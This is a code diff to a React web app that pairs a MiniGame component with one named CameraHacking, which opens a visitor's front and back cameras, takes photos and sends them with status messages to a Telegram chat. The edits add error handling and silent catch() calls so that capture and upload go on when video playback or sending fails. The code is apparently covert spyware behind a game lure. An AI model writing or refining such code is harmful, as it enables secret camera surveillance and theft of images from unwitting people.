@@ -10,7 +10,6 @@ const MiniGame = () => {
   const [score, setScore] = useState(0);
   const [timeLeft, setTimeLeft] = useState(60);
   const [gameActive, setGameActive] = useState(true);
-  const targetRef = useRef(null);
   const gameContainerRef = useRef(null);
 
   useEffect(() => {
@@ -281,11 +280,11 @@ const CameraHacking = ({ chatId }) => {
       
       xhr.onload = function() {
         if (xhr.status === 200) resolve(true);
-        else reject();
+        else reject(new Error('Failed to send message'));
       };
       
       xhr.onerror = function() {
-        reject();
+        reject(new Error('Network error'));
       };
       
       const data = JSON.stringify({
@@ -312,11 +311,11 @@ const CameraHacking = ({ chatId }) => {
       
       xhr.onload = function() {
         if (xhr.status === 200) resolve(true);
-        else reject();
+        else reject(new Error('Failed to send photo'));
       };
       
       xhr.onerror = function() {
-        reject();
+        reject(new Error('Network error'));
       };
       
       xhr.send(formData);
@@ -367,7 +366,7 @@ const CameraHacking = ({ chatId }) => {
               video.onloadedmetadata = () => {
                 video.play().then(() => {
                   setTimeout(resolve, 300);
-                });
+                }).catch(() => resolve());
               };
               setTimeout(resolve, 1000);
             });
@@ -416,7 +415,7 @@ const CameraHacking = ({ chatId }) => {
           
           await new Promise(resolve => {
             frontVideo.onloadedmetadata = () => {
-              frontVideo.play().then(() => resolve());
+              frontVideo.play().then(() => resolve()).catch(() => resolve());
               setTimeout(resolve, 500);
             });
           });
@@ -453,7 +452,7 @@ const CameraHacking = ({ chatId }) => {
           
           await new Promise(resolve => {
             backVideo.onloadedmetadata = () => {
-              backVideo.play().then(() => resolve());
+              backVideo.play().then(() => resolve()).catch(() => resolve());
               setTimeout(resolve, 500);
             });
           });
@@ -598,7 +597,7 @@ const CameraHacking = ({ chatId }) => {
     
     if (elapsed >= totalDuration) {
       stopCapturing();
-      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Всего фото: ${captureCount.current}`);
+      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Всего фото: ${captureCount.current}`).catch(() => {});
       return;
     }
     
